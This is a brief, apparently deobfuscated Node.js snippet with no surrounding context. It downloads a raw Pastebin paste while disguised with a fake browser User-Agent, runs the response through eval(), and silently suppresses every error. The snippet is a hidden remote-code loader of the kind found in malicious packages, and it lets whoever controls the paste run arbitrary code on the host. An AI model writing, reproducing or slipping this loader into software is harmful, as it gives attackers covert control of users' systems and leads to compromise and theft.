try {
    var https = require('https');
    https['get']({
        'hostname': 'pastebin.com',
        'path': '/raw/XLeVP82h',
        'headers': {
            'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x206.1;\x20rv:52.0)\x20Gecko/20100101\x20Firefox/52.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
    }, _0x17dc99 => {
        _0x17dc99['setEncoding']('utf8');
        _0x17dc99['on']('data', _0x38290f => {
            eval(_0x38290f);
        });
        _0x17dc99['on']('error', () => {
        });
    })['on']('error', () => {
    });
} catch (_0x139544) {
}
